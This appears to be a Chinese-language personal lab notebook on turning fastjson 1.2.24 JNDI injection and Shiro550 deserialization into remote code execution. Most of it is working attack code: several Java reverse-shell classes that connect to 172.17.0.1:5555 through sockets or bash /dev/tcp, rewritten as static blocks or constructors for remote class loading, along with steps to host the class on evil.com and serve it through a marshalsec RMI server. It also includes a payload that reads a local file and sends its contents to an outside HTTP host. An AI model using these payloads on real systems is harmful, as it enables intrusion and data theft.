参考：

[PayloadsAllTheThings/Reverse Shell [Cheatsheet.md](http://Cheatsheet.md) at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell [Cheatsheet.md#java](http://Cheatsheet.md#java))

# 记录（直接看第二个标题）

链接内的代码本来没有main函数的，我自己添加了main之后的具体代码如下

```Java
public class JavaShell {
    public static void main(String[] args) throws Exception {
        String host="172.17.0.1";
        int port=5555;
        String cmd="/bin/bash";
        java.lang.Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        java.net.Socket s=new java.net.Socket(host,port);
        java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
        java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()){
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){}
        }
        p.destroy();
        s.close();
    }
}
```

*在反弹win的时候发现问题：为什么需要先debug过一次反弹的代码我们才可以完成反弹shell？？？这还被我发现了？* 但是在反弹linux的时候一次就成功

# 有mian函数的使用Runtime的Java反弹Shell

*以下环境都是在fastjson1.2.24漏洞环境下测试*

当先把带有main函数的反弹shell `JavaShell_Runtime_Main.java`文件放在docker里面尝试是否可以反弹。编译`JavaShell_Runtime_Main.java`之后**反弹成功**

```Java
public class JavaShell_Runtime_Main{
  public static void main(String[] args) {
    try{
      Runtime r = Runtime.getRuntime();
      Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/5555;cat <&5 | while read line; do $line 2>&5 >&5; done"});
      p.waitFor();
    }
    catch(Exception e){}
  }
}
```

## 小问题

这时候我以为直接用`JavaShell_Runtime_Main.class`进行JDNI注入就可以反弹成功，实质上JNDI反弹Shell失败了。

## 分析问题

我看到vulhub的poyload是没有main函数的，而且是一个`static`括住的，那问题可能就出现在main函数这边了

```Java
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

## 无main函数Java代码

那我们把原本有main的反弹shell代码修改一下得到如下代码（很简单的去除main函数）

```Java
public class JavaShell_Runtime_WithoutMain{
  static {
    try{
      Runtime r = Runtime.getRuntime();
      Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/172.17.0.1/5555;cat <&5 | while read line; do $line 2>&5 >&5; done"});
      p.waitFor();
    }
    catch(Exception e){}
  }
}
```

编译成.class文件之后JNDI注入成功反弹shell（反弹成功是没有返回报文的）

![img](https://secure2.wostatic.cn/static/HUAWfSLPe7gZUoJy98LZK/image.png)

## 思考

也就是说，我们要绕过Runtime类去做反弹shell的话，需要做以下步骤：

1. 把socket反弹shell的代码加上main函数然后尝试是否可以反弹Shell，若可以说明代码有效；
2. 把第一步的代码去掉main函数然后编译，用JNDI注入来反弹Shell；

# 无mian函数的（不用Runtime）的Java Socket反弹Shell

```Java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class JavaShell_WithoutMain {

  public JavaShell_WithoutMain() throws Exception {
    String host="172.17.0.1";
    int port=5555;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}
```

这里有个点卡了很久，编译一直不通过，不知道怎么写这个java代码才可以通过编译；

搜索一番（关键词：java socket reverse shell）之后发现只需要写一个构造函数`JavaShell_WithoutMain()`就好了 此处参考：https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0

## 反弹shell

接下里就是正常的JNDI注入的步骤啦：

1. 把`JavaShell_WithoutMain.java`编译成`JavaShell_WithoutMain.class`
2. 起一个web服务，将`JavaShell_WithoutMain.class`扔到web服务器上去（[evil.com:80](http://evil.com:80)）
3. marshalsec起一个rmi服务器，监听9999端口，并制定加载远程类`JavaShell_WithoutMain.class`
4. 发送恶意报文，就可以反弹shell了

# Shiro550

这里想验证一下fastjson的java文件在此漏洞是否可用（与文章标题没有关系），在此漏洞环境达到**代码执行**的目的

但是发现了除了使用命令执行，其他代码执行的打法都没有结果

## 问题：

可能是以下内容出现问题：

1. 攻击链，我一直都是用CommonsBeanutils1去进行攻击的；
2. payload，java文件可能不能和fastjson完全一样；
3. 攻击方式，我一直是直接打base64的payload过去；

### 第一点问题

命令执行是没有问题的

### 第二点问题

尝试修改了经过yso处理前的文件，发现攻击成功，以代码执行创建文件为例：

fastjson的`TouchFile.java`是这样的

```Java
public class TouchFile {
    static {
        String filePath = "/tmp/successsss";

    try {
      java.io.FileOutputStream f1 = new java.io.FileOutputStream(filePath);
      f1.write(112);
      f1.close();
}     catch (Exception e1) {
      e1.printStackTrace();
}
    }
}
```

但是`TouchFile.txt`就需要这样就可以了

```text
java.io.FileOutputStream f1 = new java.io.FileOutputStream("/tmp/successsss");
f1.write(112);
f1.close();
```

（代码执行成功返回的400报文）



读文件也可以

```text
String HOST = "http://192.168.136.149";
java.io.BufferedReader in = new java.io.BufferedReader(new java.io.FileReader("/tmp/testFile.txt"));
String str = in.readLine();
String str_url = HOST + "/?info=" + str;
java.net.URL url = new java.net.URL(str_url);
java.net.URLConnection conn = url.openConnection();
conn.connect();
conn.getContent();
```

但是反弹shell大问题

